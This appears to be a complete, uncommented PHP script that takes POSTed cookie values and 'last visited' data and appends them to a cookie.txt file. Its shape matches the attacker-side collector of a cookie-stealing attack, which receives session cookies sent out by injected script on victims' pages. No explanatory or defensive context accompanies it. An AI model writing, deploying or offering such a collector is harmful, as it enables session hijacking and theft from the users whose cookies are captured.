<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cookie = $_POST['cookie'];
    $lastVisited = $_POST['last_visited'];
    $data = "Cookie: $cookie, Last Visited: $lastVisited\n";
    file_put_contents('cookie.txt', $data, FILE_APPEND);
}
?>
